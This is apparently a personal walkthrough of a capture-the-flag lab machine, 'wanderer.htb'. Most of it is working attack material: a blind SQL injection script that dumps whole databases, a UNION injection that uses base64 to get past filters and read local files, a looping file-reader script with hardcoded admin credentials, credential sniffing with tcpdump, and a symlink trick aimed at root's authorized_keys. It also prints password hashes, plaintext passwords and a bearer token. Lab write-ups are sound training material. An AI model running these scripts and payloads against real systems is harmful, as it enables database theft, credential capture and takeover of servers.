katja@wanderer.htb             | $2y$12$FfPJ91/XisCLmjgKnJJn8.ZEIE9Ivv13.f/qCza4dIgXJLh2zZZM2
yovecio@wanderer.htb           | $2b$12$e5GBHT6XWUNKfvLYH1viE.16y/2vUpvUOljMG/wh/qQLFkpHF9c8i

```

# Getting more out of the DB

Now I asked AI to adapt the script to export all the Tables from FTS database:

```bash
─$ python3 merda.py   
[*] Starting Table Enumeration for database: FTS
[*] Extracting next table name...
    [+] Progress: file
    [+] Found: file
----------------------------------------
[*] Extracting next table name...
    [+] Progress: fileshare
    [+] Found: fileshare
----------------------------------------
[*] Extracting next table name...
    [+] Progress: user
    [+] Found: user
----------------------------------------
[*] Extracting next table name...
[!] No more tables found.

[!] TABLE ENUMERATION COMPLETE:
 - file
 - fileshare
 - user

```

And this is the code used:

```python
import requests
import sys

# --- CONFIGURATION ---
URL = "http://10.10.110.20/api/v1/user/validate/"
EMAIL_VAL = "yovecio@wanderer.htb"
TARGET_DB = "FTS"

def rex(query):
    """Core extraction engine using Binary Search + No-Comma MID()"""
    extracted = ""
    # 1. Get length
    length = 0
    for i in range(1, 100):
        payload = f"{EMAIL_VAL}' AND (LENGTH({query})={i})-- -"
        if "true" in requests.get(URL + payload).text.lower():
            length = i
            break
    if length == 0: return None

    # 2. Extract characters
    for i in range(1, length + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"{EMAIL_VAL}' AND (ORD(MID({query} FROM {i} FOR 1)) > {mid})-- -"
            if "true" in requests.get(URL + payload).text.lower():
                low = mid + 1
            else:
                high = mid - 1
        extracted += chr(low)
        sys.stdout.write(f"\r    [+] Progress: {extracted}")
        sys.stdout.flush()
    print() 
    return extracted

def dump_tables():
    print(f"[*] Starting Table Enumeration for database: {TARGET_DB}")
    found_tables = []
    last_table = ""

    while True:
        # Querying information_schema to find the next table alphabetically
        if not last_table:
            query = f"(SELECT MIN(table_name) FROM information_schema.tables WHERE table_schema='{TARGET_DB}')"
        else:
            query = f"(SELECT MIN(table_name) FROM information_schema.tables WHERE table_schema='{TARGET_DB}' AND table_name > '{last_table}')"
        
        print(f"[*] Extracting next table name...")
        table_name = rex(query)
        
        if not table_name:
            print("[!] No more tables found.")
            break
            
        found_tables.append(table_name)
        last_table = table_name
        print(f"    [+] Found: {table_name}")
        print("-" * 40)

    print("\n[!] TABLE ENUMERATION COMPLETE:")
    for table in found_tables:
        print(f" - {table}")

if __name__ == "__main__":
    dump_tables()
```

Now as final version this script does the whole chain of enumeration DB -> TABLES -> COLUMNS -> DUMP ALL

```python
import requests
import sys

# --- CONFIGURATION ---
URL = "http://10.10.110.20/api/v1/user/validate/"
EMAIL_VAL = "yovecio@wanderer.htb"
TARGET_DB = "FTS"

def rex(query):
    """Core extraction engine using Binary Search + No-Comma MID()"""
    extracted = ""
    # 1. Get length
    length = 0
    for i in range(1, 100):
        payload = f"{EMAIL_VAL}' AND (LENGTH({query})={i})-- -"
        try:
            if "true" in requests.get(URL + payload).text.lower():
                length = i
                break
        except Exception: continue
    
    if length == 0: return None

    # 2. Extract characters
    for i in range(1, length + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"{EMAIL_VAL}' AND (ORD(MID({query} FROM {i} FOR 1)) > {mid})-- -"
            if "true" in requests.get(URL + payload).text.lower():
                low = mid + 1
            else:
                high = mid - 1
        extracted += chr(low)
        sys.stdout.write(f"\r    [+] Progress: {extracted}")
        sys.stdout.flush()
    print() 
    return extracted

def get_tables():
    tables = []
    last_table = ""
    while True:
        query = f"(SELECT MIN(table_name) FROM information_schema.tables WHERE table_schema='{TARGET_DB}'"
        if last_table: query += f" AND table_name > '{last_table}'"
        query += ")"
        
        t = rex(query)
        if not t: break
        tables.append(t)
        last_table = t
    return tables

def get_columns(table):
    columns = []
    last_col = ""
    while True:
        query = f"(SELECT MIN(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{TARGET_DB}'"
        if last_col: query += f" AND column_name > '{last_col}'"
        query += ")"
        
        c = rex(query)
        if not c: break
        columns.append(c)
        last_col = c
    return columns

def dump_data():
    print(f"[*] Starting full dump of Database: {TARGET_DB}")
    tables = get_tables()
    
    for table in tables:
        print(f"\n{'='*40}\n[Table: {table}]")
        columns = get_columns(table)
        print(f"[*] Columns: {', '.join(columns)}")
        
        # Iterating through rows using the first column as a unique sorter
        last_val = ""
        sort_col = columns[0] 
        
        while True:
            row_data = {}
            # Get the next unique value for the sort column to move to next row
            query = f"(SELECT MIN({sort_col}) FROM `{table}`"
            if last_val: query += f" WHERE {sort_col} > '{last_val}'"
            query += ")"
            
            current_sort_val = rex(query)
            if not current_sort_val: break
            
            # Now fetch all columns for this specific row
            for col in columns:
                if col == sort_col:
                    row_data[col] = current_sort_val
                else:
                    data_query = f"(SELECT {col} FROM `{table}` WHERE {sort_col}='{current_sort_val}')"
                    row_data[col] = rex(data_query)
            
            print(f"    Row: {row_data}")
            last_val = current_sort_val

if __name__ == "__main__":
    dump_data()
```

# Getting the foothold

I tried to make a chat with Gemini and since the DB only contains the metadata of the files:

```
[Table: file]
    [+] Progress: filename
    [+] Progress: id
    [+] Progress: last_update
    [+] Progress: owner
    [+] Progress: time_created
    [+] Progress: uuid
[*] Columns: filename, id, last_update, owner, time_created, uuid

Example:​​
filename: "flag.txt"
id: 1
last_update: null
owner: 1
time_created: 1740693489227
uuid: "24066bf8-0364-44ef-941d-44a104edf6a7"
```

And knowing that the file download endpoint that is accessible only by administrative users, accepts only a UUID of the file passed via a GET request:

```
 downloadFile(file) {
    fetch(this.state.hostUrl + "/api/v1/file/" + file.uuid, {
      headers: { Authorization: `Bearer ${sessionStorage.getItem("access_token")}` },
    })
      .then((response) => response.blob())
      .then((blob) => {
        const url = window.URL.createObjectURL(new Blob([blob]));
        const link = document.createElement("a");
        link.href = url;
        link.setAttribute("download", file.filename);
        document.body.appendChild(link);
        link.click();
        link.parentNode.removeChild(link);
      })
      .catch((error) => console.error(error));
  }
```

This means that the API must use a similar query to this one:

```
SELECT filename, owner FROM file WHERE uuid = '[YOUR_UUID_INPUT]';
```

And since I also footprinted that using an inexistent value as UUID shows the following outcomes:

```
xxx' OR (1=2)-- -    //Returns invalid UUID
xxx' OR (1=1)-- -    //Returns the value of the first file, aka the flag.txt
```

Now it is not strange to know that the API must be checking the following path: -Check that the UUID inputted by the user exist in the DB and obtain the file name. -Apply WAF char blacklisting (so far I know commas are blacklisted as described in the IPSECs Prep Videos). -Obtain the value of the file and passes it as download instruction.

Now if I take into consideration that the base query must be using only 2 values to match the file(again "Filename" & "Owner") then if I send something similar I can see another outcome I wasn't able to see the last time:

```
//Request
GET /api/v1/file/xxx' UNION SELECT * FROM ((SELECT '1')A JOIN (SELECT '2')B)-- - HTTP/1.1
Host: 10.10.110.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.110.20/
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzc2Njk2NDA2LCJpYXQiOjE3NzYwMDUyMDYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiJmNjI3ODhhMC03MWEzLTRjMjMtOTBlNy03ZGM2ZTQ1OWM0MjIifQ.yZgLkkhYmU6GKUEppICSkfRg300hj6LUx8ra_ZPI-d4
Connection: keep-alive
Priority: u=0

//Response
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 12 Apr 2026 15:11:05 GMT
Content-Type: application/json
Content-Length: 31
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: *

{"detail":"Error reading file"}
```

And this theory is true just because if I use 3 values on the UNION I see that the query fails:

```
//Request
GET /api/v1/file/xxx' UNION SELECT * FROM ((SELECT '1')A JOIN (SELECT '2')B JOIN (SELECT '3')C)-- - HTTP/1.1
Host: 10.10.110.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.110.20/
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzc2Njk2NDA2LCJpYXQiOjE3NzYwMDUyMDYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiJmNjI3ODhhMC03MWEzLTRjMjMtOTBlNy03ZGM2ZTQ1OWM0MjIifQ.yZgLkkhYmU6GKUEppICSkfRg300hj6LUx8ra_ZPI-d4
Connection: keep-alive
Priority: u=0

//Response
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 12 Apr 2026 15:14:07 GMT
Content-Type: application/json
Content-Length: 25
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: *

{"detail":"Invalid UUID"}
```

Now I know with the nested SELECTs I am able top bypass the Comma blacklisting but now I have to deal with "dots" and "slashes" as well and as you see the NGINX is not happy at all!

```
//Request
GET /api/v1/file/xxx' UNION SELECT * FROM ((SELECT '1')A JOIN (SELECT '../../../../../../etc/passw')B)-- - HTTP/1.1
Host: 10.10.110.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.110.20/
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzc2Njk2NDA2LCJpYXQiOjE3NzYwMDUyMDYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiJmNjI3ODhhMC03MWEzLTRjMjMtOTBlNy03ZGM2ZTQ1OWM0MjIifQ.yZgLkkhYmU6GKUEppICSkfRg300hj6LUx8ra_ZPI-d4
Connection: keep-alive
Priority: u=0

//Response
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 12 Apr 2026 15:19:17 GMT
Content-Type: text/html
Content-Length: 166
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: *

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

Now i guess I can either user HEX or Base64 encoding to bypass this right? And indeed I was right, now I have a LFI:

```
//Request
GET /api/v1/file/xxx' UNION SELECT * FROM ((SELECT '1')A JOIN (SELECT FROM_BASE64('Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=='))B64)-- - HTTP/1.1
Host: 10.10.110.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.110.20/
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzc2Njk2NDA2LCJpYXQiOjE3NzYwMDUyMDYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiJmNjI3ODhhMC03MWEzLTRjMjMtOTBlNy03ZGM2ZTQ1OWM0MjIifQ.yZgLkkhYmU6GKUEppICSkfRg300hj6LUx8ra_ZPI-d4
Connection: keep-alive
Priority: u=0

//Response
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 12 Apr 2026 15:22:41 GMT
Content-Type: application/octet-stream
Content-Length: 1800
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: *

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:108:112:MySQL Server,,,:/nonexistent:/bin/false
tcpdump:x:109:113::/nonexistent:/usr/sbin/nologin
katja:x:1001:1003::/home/katja:/bin/bash
deploy:x:1002:1004::/home/deploy:/bin/bash
benny:x:1003:1005::/home/benny:/bin/bash
preston:x:1004:1001::/home/preston:/bin/bash
syslog:x:110:114::/home/syslog:/usr/sbin/nologin
laurel:x:999:999::/var/log/laurel:/bin/false
api:x:1005:1006::/home/api:/bin/bash
```

Now I wrote a simple python script to automate the LFI with all the correct Base64 encoding:

```
import requests, base64

#URL of the challenge
URL = 'http://10.10.110.20/'
#Placeholder to make the While-not loop to work untill the user types "exit"
exit = False
#Using sessions for the login to the portal
s = requests.Session()
login = s.post(url=URL + '/api/v1/user/login',data={'username':'ftsadmin@wanderer.htb', 'password':'fallout81'})
token = login.json().get('access_token')
s.headers.update({'Authorization': 'Bearer {}'.format(token)})

def get_args():
    file = input('Path of the file to read(type "exit" to close the loop): ')
    return file

while (exit == False):
    path = get_args()
    if(path == 'exit'):
        exit = True
        break
    #Converting the file path to b64 encoding to bypass the content blacklist
    b64_path =  base64.b64encode(path.encode()).decode()
    #Forming the SQLi that bypasses both comma, and dot&slash blacklisting via B64 encoding and nested selects with unions as well
    sql_query = URL + "/api/v1/file/xxx' UNION SELECT * FROM ((SELECT '1')A JOIN (SELECT FROM_BASE64('{}'))B64)-- -".format(b64_path)
    req = s.get(sql_query)
    print('The file content is:\n{}'.format(req.text))
```

And now I can start by checking the ENV variables:

```
Path of the file to read(type "exit" to close the loop): ../../../proc/self/environ
The file content is:
LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOME=/rootLOGNAME=rootUSER=rootSHELL=/bin/shINVOCATION_ID=90b968990b97425c911ea522fc37b2d9JOURNAL_STREAM=8:23063SYSTEMD_EXEC_PID=850username=apipassword=apiSecretPw
Path of the file to read(type "exit" to close the loop): ../../../proc/self/cmdline
The file content is:
/opt/fts-api/venv/bin/python3/opt/fts-api/venv/bin/gunicornapp.main:app--workers2-kuvicorn.workers.UvicornWorker--bindunix:unix:/opt/fts-api/fts-api.sock
```

Now it is clear I can login with those credentials via ssh right?

```
ssh api@10.10.110.20                                  
The authenticity of host '10.10.110.20 (10.10.110.20)' can't be established.
ED25519 key fingerprint is: SHA256:Bm/N57Q6SivM8Jj9yElA5IAhzckGAgiT7QJGlWGzgbU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.110.20' (ED25519) to the list of known hosts.
api@10.10.110.20's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

api@fts01:~$ sudo -l
[sudo] password for api: 
Sorry, user api may not run sudo on fts01.
api@fts01:~$ hostname
fts01
api@fts01:~$
```

And I can grab another flag:

```
api@fts01:/$ cat flag.txt
HTB{d3adee56480c483d18808b30230ddc65}api@fts01:/$
```

Now I see a FTS-API which might be the .25 machine but it is accessiblen onlyt by Katja?

```
api@fts01:/opt$ ls -al
total 12
drwxr-xr-x   3 root root  4096 Mar  8  2025 .
drwxr-xr-x  18 root root  4096 Mar 17  2025 ..
drwxr-x---+  6 root katja 4096 Apr 12 02:14 fts-api
api@fts01:/opt$
```

Now running PSPY shows that there is where the API is executed from and I can see that the user "benny" is loggin into the system via SSH, which means I could potentially pollute the PAM if I can get root and sniff his credentials.

```
26/04/12 16:41:34 CMD: UID=0     PID=11262  | sshd: api [priv]     
2026/04/12 16:41:34 CMD: UID=0     PID=11261  | 
2026/04/12 16:41:34 CMD: UID=0     PID=11225  | 
2026/04/12 16:41:34 CMD: UID=0     PID=11156  | 
2026/04/12 16:41:34 CMD: UID=0     PID=11051  | 
2026/04/12 16:41:34 CMD: UID=0     PID=10982  | 
2026/04/12 16:41:34 CMD: UID=0     PID=10914  | 
2026/04/12 16:41:34 CMD: UID=0     PID=10845  | 
2026/04/12 16:41:34 CMD: UID=0     PID=938    | /opt/fts-api/venv/bin/python3 /opt/fts-api/venv/bin/gunicorn app.main:app --workers 2 -k uvicorn.workers.UvicornWorker --bind unix:unix:/opt/fts-api/fts-api.sock 
2026/04/12 16:41:34 CMD: UID=0     PID=935    | /opt/fts-api/venv/bin/python3 /opt/fts-api/venv/bin/gunicorn app.main:app --workers 2 -k uvicorn.workers.UvicornWorker --bind unix:unix:/opt/fts-api/fts-api.sock 
2026/04/12 16:41:34 CMD: UID=33    PID=929    | nginx: worker process            

 16:42:06 CMD: UID=0     PID=11532  | cat /var/lib/ubuntu-release-upgrader/release-upgrade-available 
2026/04/12 16:42:06 CMD: UID=0     PID=11533  | sshd: benny [priv]   
2026/04/12 16:42:06 CMD: UID=1003  PID=11534  | sshd: benny@pts/1    
2026/04/12 16:42:17 CMD: UID=0     PID=11535  | /lib/systemd/systemd-user-runtime-dir stop 1003 
2026/04/12 16:42:17 CMD: UID=0     PID=11536  |
```

# Road to Root

Now judging from the linpeas scan I can see that my current user can dump the TCP traffic:

```bash
Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip
```

Which means I can now listen and dump the traffic incoming to the interal ENS160 nic, showing the crealtext credentials of katja:

```bash
//Dump
pi@fts01:/tmp$ tcpdump -i ens160 -A -w ouput.pcap
tcpdump: listening on ens160, link-type EN10MB (Ethernet), snapshot length 262144 bytes
^C54 packets captured
58 packets received by filte

//Analyze
07:44:00.781327 IP 172.16.0.6.http > 172.16.0.22.53516: Flags [.], ack 229, win 508, options [nop,nop,TS val 3800631435 ecr 707591834], length 0
E..4R.@.@............P........0.....Xc.....
....*,..
07:44:00.781341 IP 172.16.0.22.53516 > 172.16.0.6.http: Flags [P.], seq 229:281, ack 1, win 502, options [nop,nop,TS val 707591834 ecr 3800631435], length 52: HTTP
E..h..@.@..............P..0.........&......
*,......username=katja%40wanderer.htb&password=Boneyard87%21
07:44:00.781351 IP 172.16.0.6.http > 172.16.0.22.53516: Flags [.], ack 281, win 508, options [nop,nop,TS val 3800631435 ecr 707591834], length 0
E..4R.@.@............P........1.....Xc.....
....*,..
07:44:00.827287 IP 172.16.0.6.59309 > 8.8.8.8.domain: 8842+ PTR? 22.0.16.172.in-addr.arpa. (42)
E..F....@.
............5.2.i"............22.0.16.172.in-addr.arpa.....
07:44:01.113299 IP 172.16.0.6.http > 172.16.0.22.53516: Flags [P.], seq 1:651, ack 281, win 508, options [nop,nop,TS val 3800631767 ecr 707591834], length 650: HTTP: HTTP/1.1 200 OK
E...R.@.@..-.........P........1.....Z......
..	.*,..HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 13 Apr 2026 07:44:01 GMT
Content-Type: application/json
Content-Length: 300
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: *

```

And now from katja's session I can grab another flag:

```bash
katja@fts01:~$ ls -al
total 36
drwxr-x--- 4 katja katja 4096 Apr 13 07:50 .
drwxr-xr-x 7 root  root  4096 Mar 10  2025 ..
lrwxrwxrwx 1 root  root     9 Mar 19  2025 .bash_history -> /dev/null
-rw-r--r-- 1 katja katja  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 katja katja 3771 Jan  6  2022 .bashrc
drwx------ 2 katja katja 4096 Apr 13 07:50 .cache
-rw-rw-r-- 1 katja katja   49 Mar  8  2025 .gitconfig
lrwxrwxrwx 1 root  root     9 Mar 19  2025 .mysql_history -> /dev/null
-rw-r--r-- 1 katja katja  807 Jan  6  2022 .profile
drwx------ 2 katja katja 4096 Mar  8  2025 .ssh
-r--r--r-- 1 root  root    37 Mar  8  2025 flag.txt
katja@fts01:~$ cat flag.txt 
HTB{6b47745104c256ad61e0c19cea671b28}

```

i can also see that she must be having access to the internal Gitlab instance:

```bash
cat .gitconfig
[user]
    name = katja
    email = katja@wanderer.htb

```

Now I will execute lipeas again to check what she can do in order to lead to a LPE to root on the machine. I can see from the hosts machine I can see the link to the internal GItLAB machine:

```bash
katja@fts01:/tmp$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 fts01 

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.16.0.100 gitlab.wanderer.htb
katja@fts01:/tmp$ 


```

# Back with the deploy user

Now from the github page I can see that the key I manged to download must be for the deploy username:

![d9e4ec419a8ee8e092fe6d82ad5aadd1.png](../../../_resources/d9e4ec419a8ee8e092fe6d82ad5aadd1.png)

# Back on root

Now here I had to ask for a nudge and apparenty that writable permission on the whole upload folder this means that even if I have root owned files I can delete them anyway because the permissions are inherited:

```bash
atja@fts01:/opt/fts-api$ ll uploads/
total 18528
drwxrwxrwx  2 root katja     4096 Apr 14 07:45 ./
drwxr-x---+ 6 root katja     4096 Apr 14 02:13 ../
-rw-r--r--  1 root root         0 Apr 14 07:45 figa
-r--r--r--  1 root katja       37 Mar  8  2025 flag.txt
-rw-r--r--  1 root katja 18959735 Mar 18  2025 peoplelookup.apk
katja@fts01:/opt/fts-api$ ll 
total 88
drwxr-x---+ 6 root katja  4096 Apr 14 02:13 ./
drwxr-xr-x  3 root root   4096 Mar  8  2025 ../
-rw-r--r--  1 root katja    33 Mar  8  2025 .env
-rwxr-xr-x  1 root katja   336 Mar  8  2025 Dockerfile*
drwxr-xr-x  3 root katja  4096 Mar  8  2025 alembic/
-rwxr-xr-x  1 root katja  1592 Mar  8  2025 alembic.ini*
drwxr-xr-x  9 root katja  4096 Mar  8  2025 app/
-rwxr-xr-x  1 root katja   149 Mar  8  2025 builddb.sh*
srwxrwxrwx+ 1 root root      0 Apr 14 02:13 fts-api.sock=
-rwxr-xr-x  1 root katja 36864 Mar  8  2025 fts.db*
-rwxr-xr-x  1 root katja     5 Mar  8  2025 pid*
-rwxr-xr-x  1 root katja   144 Mar  8  2025 requirements.txt*
-rwxr-xr-x  1 root katja   251 Mar  8  2025 run.sh*
drwxrwxrwx  2 root katja  4096 Apr 14 07:45 uploads/
drwxr-xr-x  5 root katja  4096 Mar  8  2025 venv/
katja@fts01:/opt/fts-api$ 

```

in this case it is important to make a upload of a dummy file(figa in my example) so that the file get's populated in the DB and frontend:

![03872cd712abfeb81976ee12267c2066.png](../../../_resources/03872cd712abfeb81976ee12267c2066.png)

Now since the Gunicorn server is running as root the file is owned by root byt this should not stop us from being able to delete the file and create a new link that points to the

```bash
katja@fts01:/opt/fts-api/uploads$ ll
total 18528
drwxrwxrwx  2 root katja     4096 Apr 14 07:45 ./
drwxr-x---+ 6 root katja     4096 Apr 14 02:13 ../
-rw-r--r--  1 root root         0 Apr 14 07:45 figa
-r--r--r--  1 root katja       37 Mar  8  2025 flag.txt
-rw-r--r--  1 root katja 18959735 Mar 18  2025 peoplelookup.apk
katja@fts01:/opt/fts-api/uploads$ rm figa 
rm: remove write-protected regular empty file 'figa'? Y
katja@fts01:/opt/fts-api/uploads$ ls
flag.txt  peoplelookup.apk
katja@fts01:/opt/fts-api/uploads$ ln -s /root/.ssh/id_rsa figa
katja@fts01:/opt/fts-api/uploads$ ls
figa  flag.txt  peoplelookup.apk
katja@fts01:/opt/fts-api/uploads$ ls -al
total 18528
drwxrwxrwx  2 root  katja     4096 Apr 14 07:51 .
drwxr-x---+ 6 root  katja     4096 Apr 14 02:13 ..
lrwxrwxrwx  1 katja katja       17 Apr 14 07:51 figa -> /root/.ssh/id_rsa
-r--r--r--  1 root  katja       37 Mar  8  2025 flag.txt
-rw-r--r--  1 root  katja 18959735 Mar 18  2025 peoplelookup.apk
katja@fts01:/opt/fts-api/uploads$ 


```

Which mean now when i log back in the system as FTSADMIN when i download the file it should be able to fetch the file from the link instead:

![a034779982088793950a3a9e4a19e801.png](../../../_resources/a034779982088793950a3a9e4a19e801.png)

Ok, it is an improvement, this means that i need to change the file to the correct key now:

```bash
katja@fts01:/opt/fts-api/uploads$ rm figa 
katja@fts01:/opt/fts-api/uploads$ ln -s /root/.ssh/id_ed25519 figa
katja@fts01:/opt/fts-api/uploads$ ls -al
total 18528
drwxrwxrwx  2 root  katja     4096 Apr 14 07:54 .
drwxr-x---+ 6 root  katja     4096 Apr 14 02:13 ..
lrwxrwxrwx  1 katja katja       21 Apr 14 07:54 figa -> /root/.ssh/id_ed25519
-r--r--r--  1 root  katja       37 Mar  8  2025 flag.txt
-rw-r--r--  1 root  katja 18959735 Mar 18  2025 peoplelookup.apk
katja@fts01:/opt/fts-api/uploads$ 

```

but even requesting the id key it is not working  
![aeb484cf6e14cdbcc94849f8250a5ef7.png](../../../_resources/aeb484cf6e14cdbcc94849f8250a5ef7.png)

Now it is clear that the frotnend is blocking all the files from root:

![4862c2215bfb511ff5252a9534cc67c5.png](../../../_resources/4862c2215bfb511ff5252a9534cc67c5.png)

Now with another guidance I am supposed to write the file instead, so first i create a filnk to the authorized keys:

```bash
katja@fts01:/opt/fts-api/uploads$ ll
total 18528
drwxrwxrwx  2 root  katja     4096 Apr 14 09:54 ./
drwxr-x---+ 6 root  katja     4096 Apr 14 02:13 ../
lrwxrwxrwx  1 katja katja       26 Apr 14 09:54 evil_link -> /root/.ssh/authorized_keys
-r--r--r--  1 root  katja       37 Mar  8  2025 flag.txt
-rw-r--r--  1 root  katja 18959735 Mar 18  2025 peoplelookup.apk
katja@fts01:/opt/fts-api/uploads$ 

```

Now I need to copy my local file to the file I am uploading, here it is important to save with the same name as the malicious symlink_

```bash
─$ cat /home/user/.ssh/id_rsa.pub 
